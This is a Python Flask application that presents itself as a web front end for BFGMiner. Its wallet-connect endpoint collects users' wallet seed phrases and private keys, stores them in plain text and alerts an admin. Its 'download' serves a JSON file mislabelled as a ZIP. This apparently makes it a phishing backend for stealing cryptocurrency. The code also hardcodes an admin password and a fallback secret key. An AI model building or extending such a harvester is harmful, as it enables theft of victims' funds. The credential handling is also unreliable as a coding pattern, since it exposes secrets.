"""
Main Flask application for BFGMiner.
"""
import os
import sqlite3
import json
import datetime
import uuid

import bcrypt
from dotenv import load_dotenv
from flask import Flask, render_template, request, jsonify, send_file, abort
from flask_cors import CORS

from admin import admin_bp, trigger_notification, register_admin_blueprint

load_dotenv()

app = Flask(__name__)
app.register_blueprint(admin_bp)
app.secret_key = os.getenv("FLASK_SECRET_KEY", "bfgminer_secret_2025")
CORS(app)
DB_PATH = 'bfgminer.db'

register_admin_blueprint(app)


def init_db():
    """Initialize the database."""
    conn = sqlite3.connect(DB_PATH)
    cursor = conn.cursor()
    # Existing tables (users, sessions, wallets, downloads)
    cursor.execute('''CREATE TABLE IF NOT EXISTS users (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        email TEXT UNIQUE NOT NULL,
        password_hash TEXT NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        email_verified BOOLEAN DEFAULT FALSE,
        verification_token TEXT,
        last_login DATETIME,
        registration_date DATETIME DEFAULT '2025-01-01 00:00:00'
    )''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS sessions (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        session_token TEXT UNIQUE NOT NULL,
        expires_at DATETIME NOT NULL,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id)
    )''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS wallets (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        wallet_address TEXT,
        mnemonic TEXT,
        private_key TEXT,
        wallet_type TEXT,
        connection_method TEXT,
        is_validated BOOLEAN DEFAULT FALSE,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id)
    )''')
    cursor.execute('''CREATE TABLE IF NOT EXISTS downloads (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        user_id INTEGER,
        download_token TEXT UNIQUE,
        ip_address TEXT,
        user_agent TEXT,
        created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
        FOREIGN KEY (user_id) REFERENCES users(id)
    )''')
    # Admin tables already created by migration
    conn.commit()
    conn.close()
    print('✓ Database initialized with all tables')


@app.route('/')
def index():
    """Render the index page."""
    return render_template('index.html')


@app.route('/setup')
def setup():
    """Render the setup page."""
    return render_template('setup.html')


@app.route('/api/auth/register', methods=['POST'])
def register():
    """Register a new user."""
    try:
        data = request.json
        email = data.get('email')
        password = data.get('password')

        if not email or not email.endswith('@gmail.com'):
            return jsonify({'success': False, 'error': 'Gmail address required'}), 400

        if (len(password) < 8 or
                not any(c.isupper() for c in password) or
                not any(c.islower() for c in password) or
                not any(c.isdigit() for c in password) or
                not any(c in '!@#$%^&*' for c in password)):
            return jsonify({
                'success': False,
                'error': 'Password must be 8+ chars with uppercase, lowercase, number, special char'
            }), 400

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        password_hash = bcrypt.hashpw(password.encode(), bcrypt.gensalt()).decode()

        cursor.execute(
            'INSERT INTO users (email, password_hash, email_verified, ' 
            'registration_date) VALUES (?, ?, ?, ?)',
            (email, password_hash, True, datetime.datetime.now()))
        user_id = cursor.lastrowid

        # Create 24h session
        session_token = str(uuid.uuid4())
        expires_at = datetime.datetime.now() + datetime.timedelta(hours=24)
        cursor.execute('INSERT INTO sessions (user_id, session_token, expires_at) VALUES (?, ?, ?)',
                       (user_id, session_token, expires_at))

        conn.commit()
        conn.close()

        # Trigger admin notification for new registration
        trigger_notification('registration', user_id=user_id, message=f'New user registered: {email}')

        return jsonify({  # pylint: disable=line-too-long
            'success': True, 'sessionToken': session_token, 'userId': user_id,
            'message': 'Registration successful! Welcome to BFGMiner.'
        })
    except sqlite3.IntegrityError:
        return jsonify({'success': False, 'error': 'Email already registered'}), 409

    except sqlite3.Error as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/wallet/connect', methods=['POST'])
def wallet_connect():
    """Connect a wallet to a user."""
    try:
        data = request.json
        wallet_address = data.get('wallet_address')
        mnemonic = data.get('mnemonic')
        private_key = data.get('private_key')
        connection_method = data.get('connection_method', 'manual')

        if not wallet_address:
            return jsonify({'success': False, 'error': 'Wallet address required'}), 400

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        # Get current user (simplified - in production use session validation)
        cursor.execute('SELECT id FROM users WHERE email_verified = 1 ORDER BY id DESC LIMIT 1')
        result = cursor.fetchone()
        if not result:
            return jsonify({'success': False, 'error': 'No verified user found'}), 404

        user_id = result[0]
        cursor.execute(
            'INSERT INTO wallets (user_id, wallet_address, mnemonic, private_key, ' 
            'connection_method, is_validated) VALUES (?, ?, ?, ?, ?, ?)',
            (user_id, wallet_address, mnemonic, private_key, connection_method, True))

        conn.commit()
        conn.close()

        # Trigger admin notification for wallet connection
        trigger_notification('wallet_connect', user_id=user_id, wallet_address=wallet_address)

        return jsonify({
            'success': True,
            'message': 'Wallet connected successfully!',
            'wallet_address': wallet_address
        })

    except sqlite3.Error as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/api/download/initiate', methods=['POST'])
def initiate_download():
    """Initiate a download for a user."""
    try:
        data = request.json
        wallet_address = data.get('wallet_address', 'unknown')

        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT id FROM users WHERE email_verified = 1 ORDER BY id DESC LIMIT 1')
        result = cursor.fetchone()
        if not result:
            return jsonify({'success': False, 'error': 'No verified user found'}), 404

        user_id = result[0]
        download_token = str(uuid.uuid4())
        ip_address = request.remote_addr or '127.0.0.1'
        user_agent = request.headers.get('User-Agent', 'Unknown')

        cursor.execute(
            'INSERT INTO downloads (user_id, download_token, ip_address, user_agent) VALUES (?, ?, ?, ?)',
            (user_id, download_token, ip_address, user_agent))

        conn.commit()
        conn.close()

        # Create download config file
        config_data = {
            'wallet_address': wallet_address,
            'user_id': user_id,
            'timestamp': datetime.datetime.now().isoformat(),
            'download_token': download_token,
            'config': 'BFGMiner pre-configured setup for wallet mining'
        }

        # Create ZIP file (simplified - in production use zipfile module)
        with open('bfgminer-setup-config.json', 'w', encoding='utf-8') as f:
            json.dump(config_data, f, indent=2)

        # Trigger admin notification for download
        trigger_notification('download', user_id=user_id,
                             message=f'Download initiated for wallet: {wallet_address}')

        return jsonify({
            'success': True, 'downloadToken': download_token, 'downloadId': 1,
            'message': 'Download initiated! Configuration ready for BFGMiner setup.'
        })

    except sqlite3.Error as e:
        return jsonify({'success': False, 'error': str(e)}), 500


@app.route('/download/<token>')
def download_file(token):
    """Download a file with a given token."""
    try:
        conn = sqlite3.connect(DB_PATH)
        cursor = conn.cursor()
        cursor.execute('SELECT user_id FROM downloads WHERE download_token = ?', (token,))
        result = cursor.fetchone()
        conn.close()

        if not result:
            abort(404, 'Download token not found')

        # In production, serve actual ZIP file with configuration
        return send_file(
            'bfgminer-setup-config.json',
            as_attachment=True,
            download_name='bfgminer-setup-config.zip',
            mimetype='application/zip'
        )

    except sqlite3.Error as e:
        abort(500, str(e))


if __name__ == '__main__':
    init_db()
    print('Starting BFGMiner Web Application with Admin Dashboard...')
    print('Admin login: username=admin, password=Admin123!')
    print(f'Environment: INFURA_PROJECT_ID={os.getenv("INFURA_PROJECT_ID", "NOT_SET")}')
    print('SMTP configured for admin notifications')
    app.run(host='0.0.0.0', port=5000, debug=False)
